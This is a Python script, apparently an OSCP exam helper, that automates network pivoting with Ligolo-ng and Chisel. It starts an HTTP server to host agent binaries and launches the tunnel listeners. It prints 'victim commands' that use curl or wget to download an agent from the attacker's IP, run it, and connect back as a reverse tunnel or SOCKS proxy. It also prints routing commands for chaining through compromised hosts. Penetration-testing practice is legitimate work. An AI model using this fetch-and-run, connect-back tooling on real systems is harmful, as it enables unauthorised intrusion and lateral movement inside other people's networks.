#!/usr/bin/env python3
import os
import sys
import subprocess
import socket
import time
import signal

# --- CONFIGURATION ---
TOOLS_DIR = "/opt/pivoting-tools"
HTTP_PORT = 8000
LIGOLO_PORT = 11601
CHISEL_PORT = 8080
INTERFACE_NAME = "ligolo0"

# --- COLORS ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# --- GLOBAL PROCESS TRACKING ---
background_processes = []

def print_banner():
    print(f"""{Colors.HEADER}{Colors.BOLD}
    ____  ____    __           _                     
   / __ \/  _/  _/ /_  ____  / /____  ___  _____    
  / /_/ // / | / / __ \/ __ \/ __/ _ \/ _ \/ ___/    
 / ____// /  |/ / /_/ / /_/ / /_/  __/  __/ /        
/_/   /___/  |__/\____/\____/\__/\___/\___/_/         
                                                      
    OSCP Tunnelling Helper | Sanity Check Mode
    {Colors.ENDC}""")

# --- HELPER FUNCTIONS ---

def get_kali_ip():
    """Attempts to find the tun0 IP, falls back to user input."""
    try:
        # Quick hack to get IP without external connect
        output = subprocess.check_output("ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'", shell=True)
        return output.decode().strip()
    except:
        print(f"{Colors.WARNING}[!] Could not auto-detect tun0 IP.{Colors.ENDC}")
        return input(f"{Colors.BLUE}[?] Enter your Kali IP (LHOST): {Colors.ENDC}")

def check_tools():
    """Verifies that the binary folder exists and has files."""
    required = ["proxy", "agent", "agent.exe", "chisel", "chisel.exe"]
    missing = []
    
    if not os.path.exists(TOOLS_DIR):
        print(f"{Colors.FAIL}[!] CRITICAL: Directory {TOOLS_DIR} does not exist.{Colors.ENDC}")
        print(f"Please create it and add: {', '.join(required)}")
        sys.exit(1)

    print(f"{Colors.BLUE}[*] Checking {TOOLS_DIR} for binaries...{Colors.ENDC}")
    for tool in required:
        if not os.path.exists(os.path.join(TOOLS_DIR, tool)):
            missing.append(tool)
    
    if missing:
        print(f"{Colors.WARNING}[!] Warning: Missing files: {', '.join(missing)}{Colors.ENDC}")
        input("Press Enter to continue anyway (or Ctrl+C to fix)...")
    else:
        print(f"{Colors.GREEN}[+] All binaries found.{Colors.ENDC}")

def sanity_check(description, command):
    """The Gatekeeper. Asks user before running anything."""
    print(f"\n{Colors.WARNING}--- ACTION REQUIRED ---{Colors.ENDC}")
    print(f"{Colors.BOLD}Description:{Colors.ENDC} {description}")
    print(f"{Colors.BOLD}Command:{Colors.ENDC}     {command}")
    choice = input(f"{Colors.BLUE}[?] Do you want to execute this? (y/n): {Colors.ENDC}").lower()
    return choice == 'y'

def start_http_server():
    """Starts Python HTTP server in TOOLS_DIR if not already running."""
    # Check if port is in use
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        if s.connect_ex(('0.0.0.0', HTTP_PORT)) == 0:
            print(f"{Colors.GREEN}[+] HTTP Server seems to be already running on port {HTTP_PORT}. Skipping.{Colors.ENDC}")
            return

    cmd = f"python3 -m http.server {HTTP_PORT} --directory {TOOLS_DIR}"
    if sanity_check(f"Host binaries on Port {HTTP_PORT}", cmd):
        p = subprocess.Popen(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        background_processes.append((p, "HTTP Server"))
        print(f"{Colors.GREEN}[+] HTTP Server started (PID: {p.pid}){Colors.ENDC}")

# --- MODULES ---

def module_ligolo(kali_ip):
    print(f"\n{Colors.HEADER}=== LIGOLO-NG SETUP ==={Colors.ENDC}")
    
    # 1. Setup Interface
    print(f"{Colors.BLUE}[*] checking for {INTERFACE_NAME}...{Colors.ENDC}")
    interface_exists = os.system(f"ip link show {INTERFACE_NAME} > /dev/null 2>&1") == 0
    
    if not interface_exists:
        cmd_create = f"sudo ip tuntap add user {os.environ.get('USER')} mode tun {INTERFACE_NAME}"
        cmd_up = f"sudo ip link set {INTERFACE_NAME} up"
        
        if sanity_check("Create 'ligolo0' interface (requires sudo)", cmd_create):
            os.system(cmd_create)
            os.system(cmd_up)
            print(f"{Colors.GREEN}[+] Interface created.{Colors.ENDC}")
    else:
        print(f"{Colors.GREEN}[+] Interface {INTERFACE_NAME} already exists.{Colors.ENDC}")

    # 2. Start Proxy
    cmd_proxy = f"{TOOLS_DIR}/proxy -selfcert"
    if sanity_check(f"Start Ligolo Proxy on Port {LIGOLO_PORT}", cmd_proxy):
        # We run this in a new terminal window usually, or background it. 
        # For script stability, we will background it but warn the user they can't see the console easily.
        # BETTER: Tell user to run it manually or spawn it detached?
        # Let's spawn it detached but print how to view it.
        print(f"{Colors.WARNING}[!] NOTE: Starting proxy in background. You won't see the Ligolo console.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] If you need the console (to interact), say NO and run it manually.{Colors.ENDC}")
        
        # Re-asking strictly for background execution
        if input(f"{Colors.BLUE}[?] Run in background? (y=Background / n=I will run manually): {Colors.ENDC}").lower() == 'y':
             p = subprocess.Popen(cmd_proxy.split(), cwd=TOOLS_DIR)
             background_processes.append((p, "Ligolo Proxy"))
             print(f"{Colors.GREEN}[+] Ligolo Proxy started (PID: {p.pid}){Colors.ENDC}")
        else:
             print(f"\n{Colors.BOLD}Run this in a new tab:{Colors.ENDC}")
             print(f"{cmd_proxy}\n")

    # 3. Payload Generation
    start_http_server()
    
    print(f"\n{Colors.HEADER}--- VICTIM COMMANDS ---{Colors.ENDC}")
    target_os = input(f"{Colors.BLUE}[?] Target OS (w=Windows / l=Linux): {Colors.ENDC}").lower()
    
    if target_os == 'w':
        print(f"\n{Colors.BOLD}Copy-Paste into Windows Powershell/CMD:{Colors.ENDC}")
        cmd = (f"curl http://{kali_ip}:{HTTP_PORT}/agent.exe -o agent.exe; "
               f".\\agent.exe -connect {kali_ip}:{LIGOLO_PORT} -ignore-cert")
        print(f"{Colors.GREEN}{cmd}{Colors.ENDC}")
    else:
        print(f"\n{Colors.BOLD}Copy-Paste into Linux Shell:{Colors.ENDC}")
        cmd = (f"wget http://{kali_ip}:{HTTP_PORT}/agent && chmod +x agent && "
               f"./agent -connect {kali_ip}:{LIGOLO_PORT} -ignore-cert")
        print(f"{Colors.GREEN}{cmd}{Colors.ENDC}")
        
    print(f"\n{Colors.WARNING}[!] Don't forget: Once connected, go to your Ligolo Interface and type 'start'.{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Then run: sudo ip route add <TARGET_SUBNET> dev {INTERFACE_NAME}{Colors.ENDC}")

def module_chisel(kali_ip):
    print(f"\n{Colors.HEADER}=== CHISEL SOCKS SETUP ==={Colors.ENDC}")
    
    # 1. Start Server
    cmd_server = f"{TOOLS_DIR}/chisel server -p {CHISEL_PORT} --reverse"
    if sanity_check(f"Start Chisel Server on Port {CHISEL_PORT}", cmd_server):
        p = subprocess.Popen(cmd_server.split(), stdout=subprocess.DEVNULL)
        background_processes.append((p, "Chisel Server"))
        print(f"{Colors.GREEN}[+] Chisel Server started (PID: {p.pid}){Colors.ENDC}")

    # 2. Payload
    start_http_server()
    
    print(f"\n{Colors.HEADER}--- VICTIM COMMANDS ---{Colors.ENDC}")
    target_os = input(f"{Colors.BLUE}[?] Target OS (w=Windows / l=Linux): {Colors.ENDC}").lower()
    
    if target_os == 'w':
        print(f"\n{Colors.BOLD}Copy-Paste into Windows:{Colors.ENDC}")
        # Chisel client often requires full path if not in path, assuming current dir
        cmd = (f"curl http://{kali_ip}:{HTTP_PORT}/chisel.exe -o chisel.exe; "
               f".\\chisel.exe client {kali_ip}:{CHISEL_PORT} R:socks")
        print(f"{Colors.GREEN}{cmd}{Colors.ENDC}")
    else:
        print(f"\n{Colors.BOLD}Copy-Paste into Linux:{Colors.ENDC}")
        cmd = (f"wget http://{kali_ip}:{HTTP_PORT}/chisel && chmod +x chisel && "
               f"./chisel client {kali_ip}:{CHISEL_PORT} R:socks")
        print(f"{Colors.GREEN}{cmd}{Colors.ENDC}")

    print(f"\n{Colors.WARNING}[!] Configure Proxychains to use port 1080 (default socks5).{Colors.ENDC}")

def module_double_pivot():
    print(f"\n{Colors.HEADER}=== DOUBLE PIVOT CALCULATOR ==={Colors.ENDC}")
    print("This helps you route traffic from Kali -> Pivot 1 -> Pivot 2 -> Target")
    
    p1_ip = input(f"{Colors.BLUE}[?] Enter IP of Pivot 1 (The machine you already own): {Colors.ENDC}")
    p2_ip = input(f"{Colors.BLUE}[?] Enter IP of Pivot 2 (The machine reachable by Pivot 1): {Colors.ENDC}")
    target_net = input(f"{Colors.BLUE}[?] Enter Target Subnet (e.g., 172.16.20.0/24): {Colors.ENDC}")
    
    print(f"\n{Colors.BOLD}--- EXECUTE ON PIVOT 1 ---{Colors.ENDC}")
    print("You need to tell Pivot 1 how to reach the Target Subnet via Pivot 2.")
    
    print(f"\n{Colors.GREEN}[Windows (Pivot 1)]{Colors.ENDC}")
    print(f"route add {target_net.split('/')[0]} mask 255.255.255.0 {p2_ip}")
    
    print(f"\n{Colors.GREEN}[Linux (Pivot 1)]{Colors.ENDC}")
    print(f"ip route add {target_net} via {p2_ip}")
    
    print(f"\n{Colors.WARNING}[!] Ensure Pivot 2 has a Ligolo Agent/Chisel connected back to Pivot 1 (or chained back to you).{Colors.ENDC}")

def show_help():
    print(f"""
    {Colors.BOLD}Help Menu:{Colors.ENDC}
    1. {Colors.BOLD}Ligolo-ng:{Colors.ENDC} Best for full network pivoting. Creates a network interface (ligolo0).
       - Requires 'proxy' and 'agent' binaries.
       - Allows ICMP (ping) and Nmap SYN scans.
    
    2. {Colors.BOLD}Chisel:{Colors.ENDC} Best for SOCKS proxying or specific port forwarding.
       - 'R:socks' creates a SOCKS5 proxy on your Kali (usually port 1080).
    
    3. {Colors.BOLD}Double Pivot:{Colors.ENDC} Calculates the routing commands when you are two hops deep.
    """)

# --- MAIN LOOP ---

def main():
    print_banner()
    check_tools()
    kali_ip = get_kali_ip()
    print(f"{Colors.BOLD}[*] LHOST identified as: {kali_ip}{Colors.ENDC}")
    
    while True:
        print(f"\n{Colors.HEADER}--- MAIN MENU ---{Colors.ENDC}")
        print("1. Ligolo-ng Setup (Recommended)")
        print("2. Chisel Setup")
        print("3. Double Pivot Calculator")
        print("4. Help")
        print("5. Exit")
        
        choice = input(f"{Colors.BLUE}Select an option: {Colors.ENDC}")
        
        if choice == '1':
            module_ligolo(kali_ip)
        elif choice == '2':
            module_chisel(kali_ip)
        elif choice == '3':
            module_double_pivot()
        elif choice == '4':
            show_help()
        elif choice == '5':
            print(f"\n{Colors.BOLD}Exiting...{Colors.ENDC}")
            if background_processes:
                print(f"{Colors.FAIL}[!] WARNING: The following processes are still running in the background:{Colors.ENDC}")
                for p, name in background_processes:
                    print(f" - {name} (PID: {p.pid})")
                print(f"{Colors.BOLD}To kill them manually: kill <PID>{Colors.ENDC}")
                print(f"Or run: kill {' '.join([str(p.pid) for p, _ in background_processes])}")
            sys.exit(0)
        else:
            print("Invalid selection.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user.")
        if background_processes:
                print(f"{Colors.FAIL}[!] WARNING: Background processes are still alive!{Colors.ENDC}")
                for p, name in background_processes:
                    print(f" - {name} (PID: {p.pid})")
        sys.exit(1)
